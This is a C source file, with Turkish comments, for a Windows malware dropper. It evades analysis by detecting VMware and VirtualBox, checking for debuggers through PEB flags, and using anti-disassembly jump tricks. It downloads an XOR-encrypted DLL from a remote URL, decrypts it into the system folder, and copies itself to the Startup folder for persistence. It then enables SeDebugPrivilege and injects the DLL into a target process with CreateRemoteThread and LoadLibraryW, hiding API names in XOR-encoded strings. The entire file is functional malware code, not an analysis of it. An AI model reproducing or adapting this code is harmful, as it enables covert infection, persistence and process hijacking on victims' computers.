#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <strsafe.h>
#include "Shlwapi.h"

#include "genel.h"
#include "Katarlar.h"

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "Urlmon.lib")

#define ANTI_ASM
#define ANTI_DBG
#define ANTI_VM


TCHAR szUserName[] = WANTED_USERNAME;
TCHAR gszRegPath[] = VMWARE_REG_PATH;
TCHAR gszRegKeyValue[] = VMWARE_REG_KEYVALUE;

TCHAR gszVMToolsFolder[] = VMTOOLS_FOLDER;
TCHAR gszVBOXFolder[] = VBOX_FOLDER;
//ALLUSERSPROFILE + "\Start Menu\Programs\Startup"
TCHAR szPathEnvVar[] = AUTOSTART_PATH_ENV_VAR;
TCHAR szEkPath[] = AUTOSTART_PATH_EK;
TCHAR szNewExeName[] = AUTOSTART_EXE_NAME; // bunu random mu yapsak?

TCHAR gszProcName[] = INJ_TARGET_PROC_NAME;
//SystemFolder + dllname olacak
TCHAR szPathEnvVar2[] = INJ_DLL_PATH_ENV_VAR;
TCHAR szDllFileName[] = INJ_DLL_NAME; // bunu da random yapabiliriz aslında...
//url + ÖzelWebFileName olacak
TCHAR szUrl[MAX_PATH] = DLL_DWNLD_URL;
TCHAR szWebDllFileName[] = DLL_DWNLD_FILENAME;

CHAR gszSifre[] = KATAR_SIFRE;
CHAR gszDllSifre[] = DLL_SIFRE;
// #define SIFRE_SIZE 6

TCHAR szRuntimeLoadDll[] = RUNTIME_LOAD_DLL;
CHAR szRuntimeLoadFunc2[] = RUNTIME_LOAD_FUNC2;
CHAR szRuntimeLoadFunc3[] = RUNTIME_LOAD_FUNC3;

BOOL GetProcessID(PTSTR szExeName, PDWORD pdwPID);
void CreateProc(PTCHAR szProcName);
BOOL injectDLL(DWORD dwProcessID, PTSTR szDllPath);
BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege);
BOOL RegGetVal(LPBYTE lpData, LPDWORD pcbData, PTSTR szSubkey, PTSTR szKeyValueName);
PTCHAR ComputePath(PTSTR szEnvVar, PTSTR szEkPath);
BOOL DosyaYaz(PTSTR lpszFileName, LPVOID lpData, DWORD dwSize);
PCHAR DosyaOku(PTSTR szFileName, PDWORD pdwFizeSize);
void XorEncode(PBYTE pbVeri, DWORD dwSize, PBYTE bSifre, DWORD dwSifreSize);
void DecodeW(PTCHAR szVeri);
void DecodeA(PCHAR szVeri);
void CreateProc(PTCHAR szProcName);
void AraFunc();
void DoTheJob();

DWORD_PTR gdwAraFuncAdr = (DWORD_PTR)AraFunc * 2 - 456;
DWORD_PTR gdwDoTheJobFuncAdr = ((DWORD_PTR)DoTheJob + 123) * 3;

int WINAPI WinMain(HINSTANCE hInstance,
                   HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine,
                   int nCmdShow) {

#ifdef ANTI_VM
	//UserName kontrolü
	TCHAR lpBuffer[40];
	DWORD cbBuffer = 40;
	if (!GetUserName(lpBuffer, &cbBuffer))
		goto bitir;

	DecodeW(szUserName);
	if (lstrcmp(lpBuffer, szUserName))
		goto bitir;
#endif

#ifdef ANTI_DBG
	__asm{
		mov eax, fs:[0x30]
		cmp [eax + 0x68], 0x70
		jz bitir
	}
#endif

#ifdef ANTI_ASM
	//hiç bir hatayı gösterme
	SetErrorMode(0XFFFF);

	//return jump için adres hesaple
	gdwAraFuncAdr = (gdwAraFuncAdr + 228) / 2 + 114;

	//return jump
	__asm{
		push gdwAraFuncAdr
		__emit 0x90 //bu iyiymiş //NOP
		ret
	}
#else
	AraFunc();
#endif

bitir:
	return 1;
}

void AraFunc() {
#ifdef ANTI_DBG
	__asm{
		mov eax, fs:[0x30]
		cmp [eax + 0x2], 1
		jz bitir
	}
#endif

#ifdef ANTI_ASM
	gdwDoTheJobFuncAdr = (gdwDoTheJobFuncAdr / 3) - 123;

	__asm{
		push gdwDoTheJobFuncAdr
		push fs : [0]
		mov fs : [0], esp
		xor eax, eax
		div eax
	}
#else
	DoTheJob();
#endif

bitir:
	return;
}

void DoTheJob() {

	HANDLE hToken = NULL;
	PTSTR szDllPath = NULL;
	PTSTR szNewPath = NULL;
	PCHAR pDllVeri = NULL;

#ifdef ANTI_ASM 
	__asm{
		xor eax, eax
		jz label1
		__emit 0xE9
	}
label1:
#endif

#ifdef ANTI_DBG 
	if (IsDebuggerPresent())
		goto temizle;
#endif

#ifdef ANTI_VM
	DWORD cbData = 100;
	TCHAR szValue[100];
	DecodeW(gszRegPath);
	DecodeW(gszRegKeyValue);
	if (!RegGetVal((LPBYTE)szValue, &cbData, gszRegPath, gszRegKeyValue))
		goto temizle;

	if (wcsstr(szValue, L"VMware") != NULL || wcsstr(szValue, L"VBOX") != NULL) {
		HATA(L"ANTI_VM", L"VMware kayıt defteri tespiti.");
		goto temizle;
	}
#endif

	//SystemRoot dll in olması gereken path ini hesapla
	DecodeW(szPathEnvVar2);
	szDllPath = ComputePath(szPathEnvVar2, L"");
	if (szDllPath == NULL) {
		HATA(L"DoTheJob", L"ComputePath_1");
		goto temizle;
	}

	DecodeW(szDllFileName);
	StringCchCat(szDllPath, MAX_PATH, szDllFileName);
	//hangi folder da çalışıyoruz, eğer 	
	//ALLUSERSPROFILE + "\Start Menu\Programs\Startup"	
	DecodeW(szPathEnvVar);
	DecodeW(szEkPath);
	szNewPath = ComputePath(szPathEnvVar, szEkPath);
	if (szNewPath == NULL) {
		HATA(L"DoTheJob", L"ComputePath_1");
		goto temizle;
	}

	DecodeW(szNewExeName);
	StringCchCat(szNewPath, MAX_PATH, szNewExeName);

	//EXE daha önce çalıştırılmış ve olması gereken yere kopyalanmış mı?
	TCHAR szExePath[MAX_PATH];
	GetModuleFileName(NULL, szExePath, MAX_PATH);

	if (wcscmp(szExePath, szNewPath) != NULL) {
		// olması gereken yerde değilse Kurulum yap
		// dll dosyasını webten indir
		// path e dosya ismini ekle
		TCHAR szTempPath[MAX_PATH];
		GetTempPath(MAX_PATH, szTempPath);
		//DecodeW(szWebDllFileName);
		TCHAR szTempFileFullPath[MAX_PATH];
		if (!GetTempFileName(szTempPath, NULL, 0, szTempFileFullPath)) {
			HATA(L"DoTheJob", L"URLDownloadToFile");
			goto temizle;
		}
		//StringCchCat(szTempPath, MAX_PATH, szWebDllFileName);
		//internetten dosyayı indir ve temp folder altına koy
		DecodeW(szUrl);
		DecodeW(szWebDllFileName);
		StringCchCat(szUrl, MAX_PATH, szWebDllFileName);
		HRESULT hRes = URLDownloadToFile(NULL, szUrl, szTempFileFullPath, NULL, NULL);

		if (hRes != S_OK) {
			HATA(L"DoTheJob", L"URLDownloadToFile");
			goto temizle;
		}

		//dosyayı oku ve şifreyi çöz
		DWORD dwDllSize = 0;
		pDllVeri = DosyaOku(szTempFileFullPath, &dwDllSize);
		if (pDllVeri == NULL)
			goto temizle;
		//ve şifreyi çöz
		XorEncode((PBYTE)pDllVeri, dwDllSize, (PBYTE)gszDllSifre, SIFRE_SIZE);

		//dosyayı windows altına koy
		if (!DosyaYaz(szDllPath, pDllVeri, dwDllSize))
			goto temizle;

		//bu exe nin bir kopyasını startup altına kopyala
		if (!MoveFile(szExePath, szNewPath))
			goto temizle;

		//işlemi sonlandır
		goto temizle;
	}

#ifdef ANTI_ASM 
	__asm{
		xor eax, eax
		jz label2
		__emit 0xE8
	}
label2:
#endif
	//injection yapılacak prosesin PID sini öğren
	DWORD dwProcID = 0;
	DecodeW(gszProcName);
	if (!GetProcessID(gszProcName, &dwProcID)) {
		HATA(L"DoTheJob", L"GetProcessID");
		goto temizle;
	}

	//printf("Process ID : %#x %d\n", dwProcID, dwProcID);

	//kendi prosesimizin HANDLE ını al
	HANDLE hMyProc = GetCurrentProcess();

	//prosesimizin Access TOKEN objesine erişim
	if (!OpenProcessToken(hMyProc, TOKEN_ALL_ACCESS, &hToken)) {
		HATA(L"DoTheJob", L"OpenProcessToken");
		goto temizle;
	}

	//printf("OpenProcessToken done.\n");
#ifdef ANTI_VM
	DecodeW(gszVBOXFolder);
	DecodeW(gszVMToolsFolder);
	TCHAR szHata[200];
	StringCchPrintf(szHata, 200, L"1: %s\n2: %s", gszVBOXFolder, gszVMToolsFolder);
	HATA(L"ANTI_VM_2", szHata);
	if (PathFileExists(gszVBOXFolder) || PathFileExists(gszVMToolsFolder)) {
		HATA(L"ANTI_VM", L"VMware Tools veya VBadds klasor tespiti.");
		goto temizle;
	}
#endif

	//Injection için gerekli ayrıcalığı etkin hale getir
	if (!SetPrivilege(hToken, L"SeDebugPrivilege", TRUE)) {
		HATA(L"DoTheJob", L"SetPrivilege");
		goto temizle;
	}

#ifdef ANTI_DBG_0
	DWORD_PTR dwInjectDllFuncAdr = *PDWORD(PBYTE(injectDLL) + 1) + DWORD_PTR(injectDLL) + 5;
	DWORD_PTR dwCheckSum = 0;
	for (int i = 0; i < INJECTDLL_FUNC_DWSIZE; i++)
		dwCheckSum = dwCheckSum + PDWORD_PTR(dwInjectDllFuncAdr)[i];

	if (dwCheckSum != INJECTDLL_CHECKSUM){
		TCHAR szHata[HATASIZE];
		StringCchPrintf(szHata, HATASIZE, L"CheckSum = %#x\n", dwCheckSum);
		MessageBox(
			NULL,
			szHata,
			L"DoTheJob Sorun",
			MB_ICONINFORMATION | MB_OK
			);
		goto temizle;
	}		
#endif

	//create Remote thread injection yap
	if (!injectDLL(dwProcID, szDllPath)) {
		HATA(L"DoTheJob", L"injectDLL");
		goto temizle;
	}

temizle:
	if (hToken) CloseHandle(hToken);
	free(szNewPath);
	free(pDllVeri);

	ExitProcess(1);//işlem bittiyse geriye dönmeye gerek yok
	//return;
}

void CreateProc(PTCHAR szProcName) {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	// Start the child process. 
	if (!CreateProcess(NULL, // No module name (use command line)
	                   szProcName, // Command line
	                   NULL, // Process handle not inheritable
	                   NULL, // Thread handle not inheritable
	                   FALSE, // Set handle inheritance to FALSE
	                   0, // No creation flags
	                   NULL, // Use parent's environment block
	                   NULL, // Use parent's starting directory 
	                   &si, // Pointer to STARTUPINFO structure
	                   &pi) // Pointer to PROCESS_INFORMATION structure
	) {
		HATA(L"CreateProc", L"CreateProcess failed");
		return;
	}

	// Wait until child process exits.
	WaitForSingleObject(pi.hProcess, INFINITE);

	// Close process and thread handles. 
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

BOOL GetProcessID(PTSTR szExeName, PDWORD pdwPID) {
	HANDLE hProcessSnap;
	//HANDLE hProcess;
	PROCESSENTRY32 pe32;
	//DWORD dwPriorityClass;


	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		HATA(L"GetProcessID", L"CreateToolhelp32Snapshot");
		return (FALSE);
	}

	// Set the size of the structure before using it.
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Retrieve information about the first process,
	// and exit if unsuccessful
	if (!Process32First(hProcessSnap, &pe32)) {
		HATA(L"GetProcessID", L"Process32First");
		CloseHandle(hProcessSnap); // clean the snapshot object
		return (FALSE);
	}

	// Now walk the snapshot of processes, and
	// display information about each process in turn
	do {
		if (lstrcmp(pe32.szExeFile, szExeName) == NULL) {
			*pdwPID = pe32.th32ProcessID;
			break;
		}
	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);
	return (TRUE);
}

BOOL injectDLL(DWORD dwProcessID, PTSTR szDllPath) {
	BOOL bSuccess = FALSE;
	DWORD dwErr = 0;
	PVOID pDllPath = NULL;
	HANDLE hThread = NULL;
	HANDLE hProcess = NULL;

	// runtime çalıştırılacak API lerin ayarlanması
	DecodeW(szRuntimeLoadDll);
	DecodeA(szRuntimeLoadFunc2);
	DecodeA(szRuntimeLoadFunc3);
	//
	auto myWriteProcessMemory = (decltype(WriteProcessMemory)*)GetProcAddress(GetModuleHandle(szRuntimeLoadDll),
	                                                                          szRuntimeLoadFunc2);
	auto myCreateRemoteThread = (decltype(CreateRemoteThread)*)GetProcAddress(GetModuleHandle(szRuntimeLoadDll),
	                                                                          szRuntimeLoadFunc3);

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);
	if (hProcess == NULL) {
		HATA(L"injectDLL", L"OpenProcess");
		goto temizle;
	}

	pDllPath = VirtualAllocEx(hProcess, NULL, //istediğimiz belli bir adres yok
	                          4, //boyut standart minimum boyut 4kb mı oluyor?
	                          MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (pDllPath == NULL) {
		HATA(L"injectDLL", L"VirtualAllocEx");
		goto temizle;
	}

	DWORD dwCbDllPath = lstrlen(szDllPath) * 2 + 2;

	if (!myWriteProcessMemory(hProcess, pDllPath, szDllPath, dwCbDllPath, NULL)) {
		HATA(L"injectDLL", L"WriteProcessMemory");
		goto temizle;
	}

	hThread = myCreateRemoteThread(hProcess, NULL, 0,
	                               LPTHREAD_START_ROUTINE(GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryW")),
	                               pDllPath, 0, NULL);

	if (hThread == NULL) {
		HATA(L"injectDLL", L"CreateRemoteThread");
		goto temizle;
	}

	//thread in çalışması için biraz vermek amacıyla
	WaitForSingleObject(hThread, INFINITE);
	//VirtualFreeEx(hProcess, pVeri, NULL, MEM_RELEASE);

	bSuccess = TRUE;
	//printf("injectDLL done.\n");

temizle:
	if (pDllPath)
		if (!VirtualFreeEx(hProcess, pDllPath, NULL, MEM_RELEASE))
		HATA(L"injectDLL", L"VirtualFreeEx");
	if (hThread) CloseHandle(hThread);
	if (hProcess) CloseHandle(hProcess);

	return bSuccess;
}

BOOL SetPrivilege(
	HANDLE hToken, // access token handle
	LPCTSTR lpszPrivilege, // name of privilege to enable/disable
	BOOL bEnablePrivilege // to enable or disable privilege
) {
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL, // lookup privilege on local system
		lpszPrivilege, // privilege to lookup 
		&luid)) // receives LUID of privilege
	{
		HATA(L"SetPrivilege", L"LookupPrivilegeValue");
		//printf("LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL)) {
		//printf("AdjustTokenPrivileges error: %u\n", GetLastError());
		HATA(L"SetPrivilege", L"AdjustTokenPrivileges");
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
		HATA(L"SetPrivilege", L"The token does not have the specified privilege");
		//printf("The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}

BOOL RegGetVal(LPBYTE lpData, LPDWORD pcbData, PTSTR szSubkey, PTSTR szKeyValueName) {
	HKEY hKey;
	BOOL bSuccess = FALSE;
	DWORD err = 0;

	if (err = RegOpenKeyEx(SVCHKEY, szSubkey, 0, KEY_QUERY_VALUE, &hKey)) {
#ifdef _DEBUG
		TCHAR szHata[HATASIZE];
		StringCchPrintf(szHata, HATASIZE, L"RegOpenKeyEx: %s", szSubkey);
		HATA(L"RegGetVal", szHata);
#endif
		goto Cleanup;
	}

	//64 bit te düzügn çalışmıyor mu?
	if (err = RegQueryValueEx(hKey, szKeyValueName, NULL, NULL, lpData, pcbData)) {
#ifdef _DEBUG
		TCHAR szHata[HATASIZE];
		StringCchPrintf(szHata, HATASIZE, L"RegQueryValueEx: %s", szKeyValueName);
		HATA(L"RegGetVal", szHata);
#endif
		goto Cleanup;
	}

	bSuccess = TRUE;

Cleanup:
	RegCloseKey(hKey);

	return bSuccess;
}

//sonuc adres boşaltmalı
//başarısız olursa NULL dönecektir
PTCHAR ComputePath(PTSTR szEnvVar, PTSTR szEkPath) {
	PTCHAR pPath = NULL;//bu dosyanýn full pathi için
	//envVariable size 
	DWORD nSize = 0;
	//dosya yolunu hesaplamak ve tutmak için
	PTCHAR pszPath1 = L"";

	//veriyi tutmak için gerekli olan boyutu bul
	nSize = GetEnvironmentVariable(szEnvVar, NULL, NULL);
	if (nSize == 0) {
#ifdef _DEBUG
		//printf("GetEnvironmentVariable1 is Failed. Cannot find path (%d)\n", GetLastError());
		TCHAR szHata[HATASIZE];
		StringCchPrintf(szHata, HATASIZE, L"GetEnvironmentVariable for %s (to compute size)", szEnvVar);
		HATA(L"ComputePath Failed", szHata);
#endif
		goto Cleanup;
	}
	//öğrenilen boyutta yer aç
	pszPath1 = (PTCHAR)malloc(nSize * sizeof(TCHAR)); //temizleme lazım	
	//veriyi al
	nSize = GetEnvironmentVariable(szEnvVar, pszPath1, nSize);
	if (nSize == 0) {
#ifdef _DEBUG
		//printf("GetEnvironmentVariable2 is Failed. Cannot find path (%d)\n", GetLastError());
		TCHAR szHata[HATASIZE];
		StringCchPrintf(szHata, HATASIZE, L"GetEnvironmentVariable for %s", szEnvVar);
		HATA(L"ComputePath Failed", szHata);
#endif
		goto Cleanup;
	}

	//verinin koyulacağı yeri ayarla
	pPath = (PTCHAR)malloc(MAX_PATH * sizeof(TCHAR));
	ZeroMemory(pPath, MAX_PATH * sizeof(TCHAR));

	//stringleri birbirine ekleme işlemi
	//ilk kısmı ekle
	StringCchCat(pPath, MAX_PATH, pszPath1);
	//ikinci kısmı ekle
	StringCchCat(pPath, MAX_PATH, L"\\");
	StringCchCat(pPath, MAX_PATH, szEkPath);
	StringCchCat(pPath, MAX_PATH, L"\\");

Cleanup:
	if (pszPath1) free(pszPath1);

	return pPath;
}

BOOL DosyaYaz(PTSTR lpszFileName, LPVOID lpData, DWORD dwSize) {
	HANDLE hLibFile = NULL;
	BOOL bSuccess = FALSE;

	//yeni dosyayı oluştur
	hLibFile = CreateFile(lpszFileName, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_SYSTEM, NULL);
	if (hLibFile == INVALID_HANDLE_VALUE) {
		HATA(L"DosyaYaz",L"CreateFile");
		return FALSE;
	}

	DWORD dwWritten = 0;
	if (!WriteFile(hLibFile, lpData, dwSize, &dwWritten, NULL) || dwSize != dwWritten) {
		//DWORD err = GetLastError();
		HATA(L"DosyaYaz", L"WriteFile");
		goto temizle;
	}

	bSuccess = TRUE;

temizle:
	CloseHandle(hLibFile);

	return bSuccess;
}

PCHAR DosyaOku(PTSTR szFileName, PDWORD pdwFizeSize) {
	DWORD dwStatus = 0;
	BOOL bResult = FALSE;
	HANDLE hFile = NULL;
	DWORD cbRead = 0;
	LARGE_INTEGER fileSize;
	PCHAR veri = NULL;

	hFile = CreateFile(szFileName,
	                   GENERIC_READ,
	                   FILE_SHARE_READ,
	                   NULL,
	                   OPEN_EXISTING,
	                   FILE_FLAG_SEQUENTIAL_SCAN,
	                   NULL);

	if (INVALID_HANDLE_VALUE == hFile) {
		HATA(L"DosyaOku", L"CreateFile");
		goto Temizle;
	}

	if (!GetFileSizeEx(hFile, &fileSize)) {
		HATA(L"DosyaOku", L"GetFileSizeEx");
		goto Temizle;
	}

	*pdwFizeSize = fileSize.LowPart;
	veri = (PCHAR)malloc(fileSize.LowPart);

	if (!ReadFile(hFile, veri, fileSize.LowPart, &cbRead, NULL)) {
		HATA(L"DosyaOku", L"ReadFile");
		goto Temizle;
	}

Temizle:
	if (hFile != NULL)
		CloseHandle(hFile);

	return veri;
}

void XorEncode(PBYTE pbVeri, DWORD dwSize, PBYTE bSifre, DWORD dwSifreSize) {
	for (DWORD i = 0; i < dwSize; i++)
		if (pbVeri[i] != 0 && pbVeri[i] != bSifre[i % dwSifreSize])
			pbVeri[i] = pbVeri[i] ^ bSifre[i % dwSifreSize];
}

void DecodeW(PTCHAR szVeri) {
#ifdef ENCODED_STRINGS
	XorEncode((PBYTE)szVeri, lstrlen(szVeri) * 2, (PBYTE)gszSifre, SIFRE_SIZE);
#endif
}

void DecodeA(PCHAR szVeri) {
#ifdef ENCODED_STRINGS
	XorEncode((PBYTE)szVeri, strlen(szVeri), (PBYTE)gszSifre, SIFRE_SIZE);
#endif
}
